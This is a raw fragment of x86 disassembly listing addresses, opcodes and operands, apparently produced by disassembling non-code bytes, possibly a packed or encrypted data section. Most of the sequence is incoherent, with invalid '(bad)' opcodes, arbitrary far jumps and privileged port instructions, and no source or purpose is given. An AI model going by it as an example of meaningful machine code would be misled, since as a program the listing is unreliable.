  41182d:	setae  BYTE PTR [eax+edi*8+0x18]
  411832:	xor    BYTE PTR [eax-0x1320b1cb],dh
  411838:	lods   eax,DWORD PTR ds:[esi]
  411839:	push   ecx
  41183a:	call   0x9a2:0xce00cf3b
  411841:	xor    eax,0xcd3184bf
  411846:	xor    DWORD PTR [ebp+ebp*1-0x1b838481],ebx
  41184d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41184e:	jmp    0x411877
  411850:	mov    eax,?
  411852:	mov    ebp,0x9d5e2950
  411857:	ja     0x4118b8
  411859:	xor    BYTE PTR [ebx],dl
  41185b:	mov    ds:0x9697af6c,eax
  411860:	xchg   esp,eax
  411861:	xor    al,0xbd
  411863:	ins    BYTE PTR es:[edi],dx
  411864:	lods   eax,DWORD PTR ds:[esi]
  411865:	mov    ds:0xf86d8fdb,eax
  41186a:	rol    BYTE PTR ss:[edi],cl
  41186d:	inc    ebx
  41186e:	ficomp WORD PTR [edx+edx*4]
  411871:	leave  
  411872:	sti    
  411873:	loop   0x41185d
  411875:	cwde   
  411876:	mov    WORD PTR [edx+0x70],es
  411879:	sbb    cl,dl
  41187b:	sub    BYTE PTR [edi+0xf63fd7f],ch
  411881:	pushf  
  411882:	jmp    0x4118fa
  411884:	xchg   DWORD PTR [edx-0x66e7e0df],ebp
  41188a:	ret    
  41188b:	xchg   edi,eax
  41188c:	test   al,0xce
  41188e:	daa    
  41188f:	jb     0x4118ed
  411891:	test   al,0x8b
  411893:	mov    esp,0x9fb45f00
  411898:	sub    cl,BYTE PTR [edi+0x1f442e9e]
  41189e:	mov    eax,0x799f6f34
  4118a3:	xor    BYTE PTR ds:0xaeee72f6,0xa0
  4118aa:	shr    DWORD PTR [ecx+0x22],0x39
  4118ae:	lahf   
  4118af:	in     eax,dx
  4118b0:	xchg   ebp,eax
  4118b1:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4118b3:	xchg   DWORD PTR [edx-0x16c3027c],edi
  4118b9:	retf   
  4118ba:	pop    ss
  4118bb:	jmp    0x186e7ae5
  4118c0:	js     0x4118b0
  4118c2:	xor    eax,0xbf6a69b1
  4118c7:	adc    al,0xfa
  4118c9:	xlat   BYTE PTR ds:[ebx]
  4118ca:	or     eax,0x5f5df50a
  4118cf:	in     eax,dx
  4118d0:	mov    esp,0x2240a94a
  4118d5:	cmp    DWORD PTR [edi-0x46],esp
  4118d8:	stc    
  4118d9:	fisubr WORD PTR [esi]
  4118db:	cmp    esp,edx
  4118dd:	gs xchg ebx,eax
  4118df:	loope  0x411886
  4118e1:	mov    WORD PTR [esi+ebp*8],?
  4118e4:	test   DWORD PTR [ebx-0x60],esp
  4118e7:	fstp   QWORD PTR [edx]
  4118e9:	imul   edi,DWORD PTR [esi-0x13088244],0xb9ff401
  4118f3:	jmp    0x758b:0xf37e9d1c
  4118fa:	arpl   WORD PTR [eax],si
  4118fc:	stc    
  4118fd:	in     eax,dx
  4118fe:	mov    edi,0xe422bfc4
  411903:	lods   al,BYTE PTR ds:[esi]
  411904:	(bad)
  411907:	in     eax,0xaa
  411909:	mov    bh,0xc5
  41190b:	ins    DWORD PTR es:[edi],dx
  41190c:	push   ss
  41190d:	leave  
  41190e:	push   ds
  41190f:	xor    edx,ebx
  411911:	and    eax,0xc10343cd
  411916:	xor    BYTE PTR [ebp+esi*8+0x13f320e6],0xe5
  41191e:	jno    0x411914
  411920:	pop    ss
  411921:	test   eax,0xecd062f3
  411926:	and    eax,0x9b9fa855
  41192b:	cmp    esp,eax
  41192d:	bswap  eax
  41192f:	inc    ebp
  411930:	rcl    BYTE PTR [eax],0xf
  411933:	rcr    ch,1
  411935:	ins    DWORD PTR es:[di],dx
  411937:	jl     0x4119a2
  411939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41193a:	jae    0x411904
  41193c:	dec    esp
  41193d:	dec    ecx
  41193e:	mov    ch,0xec
  411940:	out    dx,al
  411941:	mov    ds:0xc7f488fb,eax
  411946:	out    0x9c,al
  411948:	sar    BYTE PTR [edx+0x42],0xd7
  41194c:	or     DWORD PTR [ebx+esi*2],edi
  41194f:	(bad)  
  411950:	je     0x41191a
  411952:	mov    cl,0x4
  411954:	clc    
  411955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411956:	dec    ebx
  411957:	popf   
  411958:	add    ecx,DWORD PTR [ecx+ecx*4]
  41195b:	mov    edx,0xebc2627a
  411960:	out    dx,al
  411961:	adc    esi,DWORD PTR [eax+edi*1-0x42]
  411965:	and    esi,edi
  411967:	lods   eax,DWORD PTR ds:[esi]
  411968:	mov    dl,0xff
  41196a:	mov    eax,0xedd1b50a
  41196f:	in     al,0xa3
  411971:	adc    edx,DWORD PTR [ebx+0x21db033c]
  411977:	sbb    DWORD PTR [eax],0xffffff91
  41197a:	idiv   DWORD PTR [ebp-0x18e1e41e]
  411980:	xchg   BYTE PTR [esi],ch
  411982:	push   edx
  411983:	push   edi
  411984:	retf   
  411985:	pushf  
  411986:	aam    0x50
  411988:	cld    
  411989:	jg     0x411994
  41198b:	mov    ah,0xfe
  41198d:	cmp    BYTE PTR [ebp+0x69083a84],dh
  411993:	scas   eax,DWORD PTR es:[edi]
  411994:	jne    0x4119ab
  411996:	aaa    
  411997:	repnz (bad) 
  411999:	jns    0x411961
  41199b:	scas   eax,DWORD PTR es:[edi]
  41199c:	sub    al,0x29
  41199e:	lods   al,BYTE PTR ds:[esi]
  41199f:	jge    0x41192f
  4119a1:	xchg   esi,eax
  4119a2:	in     eax,dx
  4119a3:	jbe    0x4119fe
  4119a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119a6:	enter  0x45ae,0xf0
  4119aa:	daa    
  4119ab:	in     eax,dx
  4119ac:	in     eax,0xe4
  4119ae:	xor    BYTE PTR [edi],ah
  4119b0:	sbb    BYTE PTR [edx+0x27],ah
  4119b3:	sub    bh,dh
  4119b5:	int    0xba
  4119b7:	xchg   esp,eax
  4119b8:	xchg   edi,eax
  4119b9:	outs   dx,BYTE PTR ds:[esi]
  4119ba:	push   edi
  4119bb:	mov    esi,0xedb22305
  4119c0:	mov    ?,WORD PTR [edi+edx*4-0x40878798]
  4119c7:	add    al,BYTE PTR [ecx]
  4119c9:	scas   al,BYTE PTR es:[edi]
  4119ca:	mov    edi,0xc1c6d74
  4119cf:	xchg   ebx,eax
  4119d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119d1:	and    DWORD PTR [esi],edx
  4119d3:	rep ins DWORD PTR es:[edi],dx
  4119d5:	push   ds
  4119d6:	xor    eax,0x80c91b42
  4119db:	je     0x411a00
  4119dd:	sub    BYTE PTR [ecx-0x62],0x4b
  4119e1:	fwait
  4119e2:	retf   
  4119e3:	ja     0x411a46
  4119e5:	pop    ecx
  4119e6:	ins    DWORD PTR es:[edi],dx
  4119e7:	jmp    0x60407fae
  4119ec:	add    eax,0xe5c4b7ca
  4119f1:	sti    
  4119f2:	push   0x27f7590f
  4119f7:	mov    ch,0x4a
  4119f9:	adc    dh,BYTE PTR [eax-0x5304754]
  4119ff:	mov    ah,0x92
  411a01:	jmp    0x4119e9
  411a03:	fs dec ecx
  411a05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a06:	xlat   BYTE PTR ds:[ebx]
  411a07:	add    eax,0xdddbb87b
  411a0c:	repnz dec ecx
  411a0e:	int    0x59
  411a10:	add    BYTE PTR [esi+0x291eff82],ah
  411a16:	xor    eax,0xb9792bd8
  411a1b:	jbe    0x4119d0
  411a1d:	sbb    al,0x6a
  411a1f:	pop    edi
  411a20:	ss std 
  411a22:	mov    ebp,0x37a1c957
  411a27:	inc    ecx
  411a28:	cmp    eax,eax
  411a2a:	outs   dx,BYTE PTR ds:[esi]
  411a2b:	pop    eax
  411a2c:	add    al,0x98
  411a2e:	ss inc esi
  411a30:	lock sahf 
  411a32:	mov    ebx,0x9ab6c3c7
  411a37:	cmp    bh,BYTE PTR [edi]
  411a39:	out    dx,al
  411a3a:	ret    
  411a3b:	(bad)  
  411a3c:	dec    ebp
  411a3d:	pop    edi
  411a3e:	mov    al,0xa4
  411a40:	shr    DWORD PTR [edx],cl
  411a42:	ss adc eax,0xe600efb5
  411a48:	cdq    
  411a49:	xlat   BYTE PTR ds:[ebx]
  411a4a:	mov    edx,0x1c08ba58
  411a4f:	(bad)  
  411a50:	fist   DWORD PTR [ebx]
  411a52:	mov    esi,0x4ceccfd4
  411a57:	sbb    al,0xb5
  411a59:	or     al,BYTE PTR [ecx-0x12]
  411a5c:	mov    bh,0x4d
  411a5e:	xchg   ebp,eax
  411a5f:	scas   eax,DWORD PTR es:[edi]
  411a60:	and    al,0x39
  411a62:	fwait
  411a63:	and    DWORD PTR [ebx],0x61b995c8
  411a69:	(bad)  
  411a6b:	jne    0x411aa1
  411a6d:	arpl   WORD PTR [ecx-0x1990345d],bx
  411a73:	add    dh,BYTE PTR [edx+0x26]
  411a76:	lds    ebp,FWORD PTR ds:0xb4ba9c6f
  411a7c:	mov    dl,0xdf
  411a7e:	push   0xd8685f5
  411a83:	in     al,dx
  411a84:	retf   
  411a85:	sbb    al,0xce
  411a87:	pop    ss
  411a88:	xchg   esp,eax
  411a89:	jns    0x411a55
  411a8b:	xchg   edx,eax
  411a8c:	repnz adc BYTE PTR [edx+0x38],bl
  411a90:	arpl   WORD PTR [ecx],bx
  411a92:	jmp    0xebde3285
  411a97:	(bad)  
  411a98:	cmp    BYTE PTR [edi],ch
  411a9a:	add    ecx,ebx
  411a9c:	xor    al,0xbc
  411a9f:	jle    0x411a70
  411aa1:	(bad)  
  411aa2:	jp     0x411abc
  411aa4:	es loopne 0x411ad2
  411aa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411aa8:	push   es
  411aa9:	fwait
  411aaa:	in     eax,0xd0
  411aac:	arpl   WORD PTR [esi+0x2a551cbc],bx
  411ab2:	sub    al,0xf3
  411ab4:	add    BYTE PTR [ebx+ebp*1-0x5cb67901],ch
  411abb:	mul    DWORD PTR [ebp+0x1aa49de0]
  411ac1:	fdiv   DWORD PTR [esi-0x152cda3e]
  411ac7:	jmp    0x75d:0xb0a83c33
  411ace:	arpl   WORD PTR [ebp-0x20],si
  411ad1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ad2:	dec    ebx
  411ad3:	enter  0x7c94,0x6f
  411ad7:	popf   
  411ad8:	and    ebx,DWORD PTR [ebx-0x2404ee05]
  411ade:	cmovb  ebx,DWORD PTR [ebx+0x48]
  411ae2:	dec    ecx
  411ae3:	dec    esp
  411ae4:	and    eax,0x9ea4e680
  411ae9:	and    eax,0xa3755439
  411aee:	sti    
  411aef:	mov    ah,BYTE PTR [ebp+esi*8-0x7a]
  411af3:	cmp    al,0xef
  411af5:	adc    eax,eax
  411af7:	dec    esp
  411af8:	xchg   edi,eax
  411af9:	mov    cl,0xbf
  411afb:	inc    esp
  411afc:	or     eax,DWORD PTR [edi+0x6]
  411aff:	xchg   DWORD PTR [esi+0x44],esi
  411b02:	mov    WORD PTR [edx],es
  411b04:	xlat   BYTE PTR ds:[ebx]
  411b05:	and    bh,BYTE PTR [eax]
  411b07:	cli    
  411b08:	shl    DWORD PTR [edi+0x18],1
  411b0b:	jmp    0xd4fb413a
  411b10:	inc    edx
  411b11:	lods   al,BYTE PTR ds:[esi]
  411b12:	cdq    
  411b13:	scas   eax,DWORD PTR es:[edi]
  411b14:	add    eax,0xcfe65e84
  411b19:	lahf   
  411b1a:	fcom   st(3)
  411b1c:	sbb    eax,0x36d94be9
  411b21:	pop    ds
  411b22:	xor    ecx,DWORD PTR [ecx+0x11ba00a]
  411b28:	jmp    0x411b24
  411b2a:	ins    BYTE PTR es:[edi],dx
  411b2b:	mov    dl,0x1c
  411b2d:	dec    esi
  411b2e:	imul   ebx,DWORD PTR ds:0x13bda924,0x2d
  411b35:	xor    DWORD PTR [ecx+0x33],ecx
  411b38:	xchg   BYTE PTR [edi-0x53],dh
  411b3b:	outs   dx,DWORD PTR ds:[esi]
  411b3c:	(bad)  
  411b3d:	cdq    
  411b3e:	retf   
  411b3f:	jne    0x411ae0
  411b41:	push   0xffffffd2
  411b43:	mov    eax,0xc93fc920
  411b48:	sbb    esp,edx
  411b4a:	lods   al,BYTE PTR ds:[esi]
  411b4b:	jns    0x411b2f
  411b4d:	popf   
  411b4e:	fild   DWORD PTR [ecx]
  411b50:	ins    DWORD PTR es:[edi],dx
  411b51:	stc    
  411b52:	enter  0xfa96,0x5e
  411b56:	and    eax,0xb22c137a
  411b5b:	xor    al,0xf3
  411b5d:	shl    ah,cl
  411b5f:	jp     0x411b28
  411b61:	xor    eax,0x6851d79e
  411b66:	xchg   ch,ch
  411b68:	xor    bh,BYTE PTR ds:0xf91881a9
  411b6e:	(bad)  
  411b6f:	stos   DWORD PTR es:[edi],eax
  411b70:	sti    
  411b71:	ins    BYTE PTR es:[edi],dx
  411b72:	xor    ecx,DWORD PTR [edx+0x46ed5fa9]
  411b78:	jle    0x411b32
  411b7a:	mov    ds:0x60088e30,eax
  411b7f:	not    dl
  411b81:	test   BYTE PTR [ecx+0x6e],cl
  411b84:	rcr    BYTE PTR [esi+esi*4-0x1c],1
  411b88:	and    edx,DWORD PTR [ebx]
  411b8a:	in     eax,dx
  411b8b:	pop    esp
  411b8c:	push   es
  411b8d:	loope  0x411b52
  411b8f:	loopne 0x411b69
  411b91:	rcl    DWORD PTR [eax+0x7e],0x93
  411b95:	jns    0x411b47
  411b97:	jp     0x411b8a
  411b99:	dec    edx
  411b9a:	push   ecx
  411b9b:	cmp    ebp,ebx
  411b9d:	xor    bh,BYTE PTR [esi+eax*4-0x407451f3]
  411ba4:	stos   DWORD PTR es:[edi],eax
  411ba5:	xlat   BYTE PTR ds:[ebx]
  411ba6:	push   ebp
  411ba7:	or     BYTE PTR [ecx-0x3a],0x17
  411bab:	imul   edi,esi,0x87aab776
  411bb1:	push   ebp
  411bb2:	mov    bh,0xc4
  411bb4:	sahf   
  411bb5:	or     eax,0xcb35d3b5
  411bba:	or     eax,0x124a73e9
  411bbf:	les    edx,FWORD PTR [esi+0x18]
  411bc2:	(bad)  
  411bc3:	cmp    eax,0xe8909b89
  411bc8:	mov    edi,0x4ec238dc
  411bcd:	ss fs push edi
  411bd0:	and    al,0x99
  411bd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bd3:	cmp    al,0x43
  411bd5:	mov    eax,ds:0xe8c8be7b
  411bda:	loopne 0x411c12
  411bdc:	dec    eax
  411bdd:	pop    edi
  411bde:	pop    eax
  411bdf:	test   edx,esp
  411be1:	push   esi
  411be2:	stos   BYTE PTR es:[edi],al
  411be3:	lea    ecx,gs:[ebp-0x33f8107a]
  411bea:	fwait
  411beb:	dec    ebx
  411bec:	jecxz  0x411c07
  411bee:	pop    ss
  411bef:	sub    DWORD PTR [ebx+0x35],edx
  411bf2:	sub    ecx,DWORD PTR [eax-0xc472f64]
  411bf8:	mov    ecx,0x8c74ecd4
  411bfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bfe:	cmp    BYTE PTR [ebx],ah
  411c00:	cmc    
  411c01:	sbb    BYTE PTR [esi+esi*1],cl
  411c04:	pop    edx
  411c05:	out    0x6,al
  411c07:	pusha  
  411c08:	pop    ss
  411c09:	jge    0x411c29
  411c0b:	fsubr  DWORD PTR [ecx]
  411c0d:	mov    bl,0x58
  411c0f:	jle    0x411c34
  411c11:	dec    esi
  411c12:	mov    al,ds:0xb17ed096
  411c17:	or     BYTE PTR [edi-0x3a7f8466],dl
  411c1d:	mov    ah,0xea
  411c1f:	push   esi
  411c20:	iret   
  411c21:	push   edi
  411c22:	test   BYTE PTR ds:0x24c9d79b,ah
  411c28:	shr    DWORD PTR [esi],1
  411c2a:	and    eax,0x3ba6462b
  411c2f:	loop   0x411beb
  411c31:	sbb    ch,bh
  411c33:	mov    cl,dl
  411c35:	and    DWORD PTR [esi],edi
  411c37:	es adc dl,dl
  411c3a:	mov    ebx,0xd34d19c4
  411c3f:	rol    BYTE PTR [esi+0x1d],cl
  411c42:	inc    ebp
  411c43:	and    BYTE PTR [edi+0x792719f2],ch
  411c49:	nop
  411c4a:	mov    eax,0xc09f9c0f
  411c4f:	(bad)  
  411c50:	les    esp,FWORD PTR [ebx]
  411c52:	mov    dh,0x70
  411c54:	and    cl,BYTE PTR ds:0xef28fac7
  411c5a:	bound  edx,QWORD PTR [ebp-0x2907774a]
  411c60:	push   ss
  411c61:	pop    ss
  411c62:	xchg   esi,eax
  411c63:	js     0x411c39
  411c65:	jno    0x411c54
  411c67:	je     0x411c4b
  411c69:	mov    bh,0xb8
  411c6b:	aam    0x3f
  411c6d:	mov    edx,0xd9699b62
  411c72:	scas   al,BYTE PTR es:[edi]
  411c73:	jge    0x411c0a
  411c75:	mov    bl,0xb3
  411c77:	pop    esp
  411c78:	fnstsw WORD PTR [ebp-0x61]
  411c7b:	jmp    0x551a:0xe4ed60fa
  411c82:	mul    BYTE PTR [ebx]
  411c84:	mov    edi,0x9f215e7
  411c89:	icebp  
  411c8a:	xor    BYTE PTR [esi-0x5b4178ea],0x6
  411c91:	js     0x411c63
  411c93:	dec    ebp
  411c94:	adc    BYTE PTR [ebx-0x41],dh
  411c97:	xor    al,0x1a
  411c99:	push   esp
  411c9a:	sbb    BYTE PTR [eax*2-0x7d09c34a],bh
  411ca1:	(bad)  
  411ca2:	loopne 0x411c8f
  411ca4:	xchg   ebp,eax
  411ca5:	add    al,0x51
  411ca7:	xor    DWORD PTR [ebx-0x7e3a5568],edx
  411cad:	daa    
  411cae:	daa    
  411caf:	jmp    0x17dcc1f1
  411cb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cb5:	repz xor al,ch
  411cb8:	addr16 cmp eax,0x62831dc3
  411cbe:	sub    BYTE PTR [edx+edi*1+0x10],dh
  411cc2:	mov    bl,0xa4
  411cc4:	mov    WORD PTR [esi],fs
  411cc6:	sbb    ebx,DWORD PTR [ebp-0x155c16db]
  411ccc:	push   cs
  411ccd:	aaa    
  411cce:	in     al,0xb4
  411cd0:	dec    ebp
  411cd1:	fld    DWORD PTR [ecx]
  411cd3:	cs loope 0x411cdc
  411cd6:	stos   BYTE PTR es:[edi],al
  411cd7:	sti    
  411cd8:	aas    
  411cd9:	into   
  411cda:	jno    0x411cd3
  411cdc:	push   cs
  411cdd:	lahf   
  411cde:	mov    dh,0xbb
  411ce0:	lds    ecx,FWORD PTR [edx+ebx*2-0x2528460e]
  411ce7:	sub    edx,DWORD PTR [edx]
  411ce9:	fwait
  411cea:	pop    ss
  411ceb:	sub    BYTE PTR [ecx],bl
  411ced:	xor    eax,0xd76da585
  411cf2:	push   esi
  411cf3:	sbb    eax,0xe7a06495
  411cf8:	inc    ebx
  411cf9:	or     BYTE PTR [ebp-0x49f6045a],ah
  411cff:	xchg   edi,eax
  411d00:	push   0x2807e1eb
  411d05:	shr    DWORD PTR [esi+edx*2-0x68],1
  411d09:	cmp    ah,al
  411d0b:	mov    bh,0x5
  411d0d:	mov    al,ds:0x2979eb76
  411d12:	call   0xfbba3741
  411d17:	fwait
  411d18:	xor    al,0x2c
  411d1a:	dec    ebp
  411d1b:	lock (bad) 
  411d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d1e:	sti    
  411d1f:	call   0xcb56e86f
  411d24:	jns    0x411d71
  411d26:	inc    eax
  411d27:	(bad)  
  411d28:	xor    cl,BYTE PTR [edi-0x186d1b48]
  411d2e:	or     ecx,DWORD PTR [edx-0x1a3980eb]
  411d34:	cvtps2pi mm2,QWORD PTR [eax]
  411d37:	mov    ch,0x18
  411d39:	imul   esi,DWORD PTR [edi-0x35],0xeef94d20
  411d40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d41:	and    al,0x1
  411d43:	mov    edi,0x60b5b920
  411d48:	js     0x411d96
  411d4a:	int    0xd8
  411d4c:	pop    edi
  411d4d:	imul   edx,ebp,0x8c6c46cd
  411d53:	mov    ds:0xacb49ed4,al
  411d58:	mov    ch,0xdb
  411d5a:	fdivrp st(2),st
  411d5c:	stos   DWORD PTR es:[edi],eax
  411d5d:	rcr    bh,0x3c
  411d60:	or     eax,0x2473ad5a
  411d65:	push   ss
  411d66:	pushf  
  411d67:	xor    edx,DWORD PTR [ecx-0x78]
  411d6a:	mov    bh,0xc0
  411d6c:	inc    edx
  411d6d:	or     ch,BYTE PTR fs:[ebx+ecx*2+0x2a]
  411d72:	adc    esi,DWORD PTR [eax+0x6673a8ec]
  411d78:	(bad)  
  411d79:	fisttp WORD PTR [edi]
  411d7b:	xor    bl,BYTE PTR [eax]
  411d7d:	jmp    0x77fc0934
  411d82:	hlt    
  411d83:	jb     0x411d29
  411d85:	fwait
  411d86:	fwait
  411d87:	fs stos BYTE PTR es:[edi],al
  411d89:	xchg   ebp,eax
  411d8a:	das    
  411d8b:	mov    esi,0x7c35541f
  411d90:	add    al,0xca
  411d92:	jmp    0x64f2:0x391d34f4
  411d99:	int3   
  411d9a:	fist   DWORD PTR [eax]
  411d9c:	mov    cs,ebp
  411d9e:	das    
  411d9f:	mov    ds:0xc0f6d325,eax
  411da4:	test   DWORD PTR [ebx-0x76],edi
  411da7:	loopne 0x411db3
  411da9:	call   0xf253:0x708771e0
  411db0:	mov    ds:0x29c8aba0,al
  411db5:	sbb    al,BYTE PTR [ecx+0x5a]
  411db8:	cli    
  411db9:	add    BYTE PTR [ecx],al
  411dbb:	mov    edi,0x44bd1240
  411dc0:	call   0x45cceb20
  411dc5:	loope  0x411db3
  411dc7:	out    0x48,al
  411dc9:	jp     0x411d65
  411dcb:	bound  ebx,QWORD PTR [edi]
  411dcd:	or     DWORD PTR [esi+eiz*2+0x15],ebx
  411dd1:	jmp    0x578c:0xe723973
  411dd8:	mov    ecx,0xc5f5534f
  411ddd:	jne    0x411d80
  411ddf:	out    dx,al
  411de0:	sbb    cl,cl
  411de2:	add    BYTE PTR [edi],cl
  411de4:	stos   BYTE PTR es:[edi],al
  411de5:	out    0xc6,eax
  411de7:	xor    ebx,esi
  411de9:	mov    eax,ds:0x3d44301b
  411dee:	push   ebp
  411def:	and    edx,DWORD PTR [ebx+0x658ca14]
  411df5:	sub    esp,DWORD PTR gs:[ebp-0x2e1839e5]
  411dfc:	mov    WORD PTR [edi-0x642bf35],ds
  411e02:	test   DWORD PTR [ecx+0x13c75fe6],ebp
  411e08:	and    DWORD PTR [edi-0x6d312b4b],esp
  411e0e:	dec    ebp
  411e0f:	mul    DWORD PTR [ebp+0x72]
  411e12:	pop    esi
  411e13:	jmp    0x4e1d5ffb
  411e18:	and    cl,BYTE PTR [ecx-0x58]
  411e1b:	sbb    BYTE PTR [ecx-0x62],ah
  411e1e:	xor    eax,0xcba2ca2d
  411e23:	dec    edi
  411e24:	jg     0x411de2
  411e26:	repz jp 0x411e0b
  411e29:	inc    eax
  411e2a:	and    ecx,eax
  411e2c:	and    edx,esp
  411e2e:	mov    al,0x74
  411e30:	xor    BYTE PTR [ecx+ebx*8-0x27],cl
  411e34:	mov    ch,0x49
  411e36:	sti    
  411e37:	in     al,0xee
  411e39:	fwait
  411e3a:	mov    al,ds:0x4d891c68
  411e3f:	adc    al,0xfe
  411e41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e42:	push   ecx
  411e43:	mov    esp,0x6ebb9c04
  411e48:	ds inc esp
  411e4a:	loopne 0x411e7a
  411e4c:	jmp    0x4b885aa9
  411e51:	mov    al,0xb6
  411e53:	add    al,0x5b
  411e55:	out    dx,eax
  411e56:	inc    ebx
  411e57:	and    DWORD PTR [ebp+0x1b],0xffffff83
  411e5b:	lock and BYTE PTR [esi+0x7cdd1c48],ch
  411e62:	arpl   bp,di
  411e64:	sbb    eax,0x2ce65010
  411e69:	in     al,dx
  411e6a:	scas   eax,DWORD PTR es:[edi]
  411e6b:	rcl    bh,1
  411e6d:	gs and eax,0x6ba53760
  411e73:	or     dh,BYTE PTR [ebx-0x57]
  411e76:	in     eax,dx
  411e77:	add    dl,BYTE PTR [esi]
  411e79:	fstp   DWORD PTR [edx]
  411e7b:	mov    edx,0xf37f5bde
  411e80:	cmp    al,0x33
  411e82:	or     al,0xf6
  411e84:	inc    esi
  411e85:	inc    ebp
  411e86:	int3   
  411e87:	sbb    eax,0xc4b78174
  411e8c:	push   ds
  411e8d:	leave  
  411e8e:	aad    0x9a
  411e90:	and    esi,DWORD PTR [eax]
  411e92:	ds jbe 0x411e2d
  411e95:	scas   al,BYTE PTR es:[edi]
  411e96:	fwait
  411e97:	push   edi
  411e98:	jae    0x411ec6
  411e9a:	pusha  
  411e9b:	mov    al,0xbe
  411e9d:	cdq    
  411e9e:	cs mov edx,0xc91dda0e
  411ea4:	lds    esp,FWORD PTR [edi+0x14d76dd5]
  411eaa:	and    bl,BYTE PTR [esi+0x46]
  411ead:	ins    BYTE PTR es:[edi],dx
  411eae:	imul   ebx,DWORD PTR [esi+0x55],0xffffffa6
  411eb2:	addr16 cmp eax,0x931fdf13
  411eb8:	addr16 push ecx
  411eba:	mov    ebx,0xb2037184
  411ebf:	ss push es
  411ec1:	cmp    dh,ah
  411ec3:	loopne 0x411eca
  411ec5:	fsubr  QWORD PTR [esi-0x5aaee523]
  411ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ecc:	jle    0x411f40
  411ece:	add    ch,BYTE PTR [ecx]
  411ed0:	pop    esp
  411ed1:	jle    0x411e8a
  411ed3:	add    al,0xf0
  411ed5:	and    eax,0x8176830a
  411eda:	stc    
  411edb:	push   esp
  411edc:	out    0x9a,eax
  411ede:	mov    ebp,0x751ff3dd
  411ee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ee4:	inc    ebx
  411ee5:	push   0x1a47678
  411eea:	mov    ebp,0xcf22aa98
  411eef:	test   eax,0xfc05a919
  411ef4:	mov    eax,0x30a39189
  411ef9:	pop    ecx
  411efa:	or     ebx,0xffffff9b
  411efd:	loop   0x411eee
  411eff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f00:	xlat   BYTE PTR ds:[ebx]
  411f01:	xor    eax,0x6e251354
  411f06:	enter  0x9fee,0xc3
  411f0a:	loope  0x411ef6
  411f0c:	sbb    ecx,ebx
  411f0e:	adc    ebp,DWORD PTR [eax+0x31111a2]
  411f14:	mov    cl,0xa8
  411f16:	imul   esp,DWORD PTR [ebx-0x14],0xffffffb1
  411f1a:	hlt    
  411f1b:	jne    0x411f1a
  411f1d:	push   cs
  411f1e:	pop    esi
  411f1f:	add    eax,0xa4bf2ede
  411f24:	inc    ebx
  411f25:	jns    0x411f79
  411f27:	dec    ebx
  411f28:	or     BYTE PTR [edi+0x5],cl
  411f2b:	dec    ebp
  411f2c:	div    BYTE PTR [ecx+0x10fde02e]
  411f32:	mov    bl,0xc0
  411f34:	pop    ss
  411f35:	cdq    
  411f36:	sbb    eax,0x77d67d55
  411f3b:	fild   WORD PTR [ecx+0x1b]
  411f3e:	jae    0x411f1c
  411f40:	pop    ecx
  411f41:	sti    
  411f42:	nop
  411f43:	fisub  WORD PTR [esi+0x6d8cb5c4]
  411f49:	jmp    0x411fa5
  411f4b:	dec    esi
  411f4c:	mov    esp,0x4bf4b825
  411f51:	call   0xf48c:0x9e85c9e5
  411f58:	adc    DWORD PTR [edi-0x56],eax
  411f5b:	add    BYTE PTR [esi],0x7a
  411f5e:	das    
  411f5f:	nop
  411f60:	mov    al,ds:0x27a6ad9d
  411f65:	adc    esi,DWORD PTR [esi+esi*2]
  411f68:	and    eax,0xdfed3ff5
  411f6d:	sub    eax,0x592278bb
  411f72:	cmp    DWORD PTR [ebx],esp
  411f74:	(bad)  
  411f76:	cdq    
  411f77:	stos   BYTE PTR es:[edi],al
  411f78:	fwait
  411f79:	pusha  
  411f7a:	fnsave [eax+0x2a]
  411f7d:	popf   
  411f7e:	push   edi
  411f7f:	xlat   BYTE PTR ds:[ebx]
  411f80:	xchg   ebx,eax
  411f81:	sbb    ah,bh
  411f83:	test   BYTE PTR [edx+0x64aaaa28],bl
  411f89:	mov    ds:0xce04e4cd,al
  411f8e:	push   es
  411f8f:	xor    DWORD PTR [ecx+eiz*4-0x11c70e45],ebp
  411f96:	mov    esi,0x95c9a48e
  411f9b:	int3   
  411f9c:	ins    BYTE PTR es:[edi],dx
  411f9d:	nop
  411f9e:	mov    bh,0x84
  411fa0:	stc    
  411fa1:	push   ebp
  411fa2:	clc    
  411fa3:	or     edx,DWORD PTR ds:0x8e52eac
  411fa9:	cmp    edi,DWORD PTR [edx]
  411fab:	push   esp
  411fac:	and    al,0x59
  411fae:	aas    
  411faf:	fidiv  WORD PTR [eax]
  411fb1:	xchg   ebx,eax
  411fb2:	inc    esp
  411fb3:	sub    al,BYTE PTR [esi]
  411fb5:	fldlg2 
  411fb7:	add    ecx,DWORD PTR [edi+ebx*4]
  411fba:	pop    ebx
  411fbb:	sbb    esp,edx
  411fbd:	and    BYTE PTR [esp+esi*1-0x7a5b55f0],bh
  411fc4:	sub    esp,esp
  411fc6:	xchg   ebx,eax
  411fc7:	sbb    DWORD PTR [edi-0x7b],ecx
  411fca:	aaa    
  411fcb:	test   al,0xd2
  411fcd:	dec    edx
  411fce:	(bad)  
  411fcf:	push   0xf32ba090
  411fd4:	(bad)  
  411fd5:	cmp    edi,0x8c03dfba
  411fdb:	dec    ebp
  411fdc:	jle    0x411fa6
  411fde:	scas   al,BYTE PTR es:[edi]
  411fdf:	jne    0x411fe4
  411fe1:	loop   0x412045
  411fe3:	hlt    
  411fe4:	loop   0x41201e
  411fe6:	jl     0x41200a
